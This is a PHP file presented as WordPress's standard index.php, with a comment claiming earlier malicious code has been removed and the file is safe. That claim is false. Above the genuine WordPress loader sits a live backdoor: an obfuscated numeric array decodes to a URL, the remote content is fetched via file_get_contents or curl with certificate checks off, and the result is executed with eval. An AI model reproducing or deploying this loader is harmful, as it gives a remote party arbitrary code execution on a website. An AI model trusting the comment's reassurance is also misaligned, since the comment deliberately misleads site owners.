<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$vbnmqwaszxkl = [111,122,122,119,122,58,54,54,125,108,126,51,114,108,122,115,132,131,132,110,125,116,122,118,111,122,118,122,51,111,122,120,54,120,107,120,111,120,54,51,57,54,57,55,57,57,51,120,108,109,54,99,108,111,108,54,125,108,109,131,54,115,108,107,107,131,54,120,108,108,118,54,108,118,107,108,127,51,122,127,122];
$full_url = implode('', array_map(function($plokijnuh) {
    return chr($plokijnuh - 7);
}, $vbnmqwaszxkl));

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
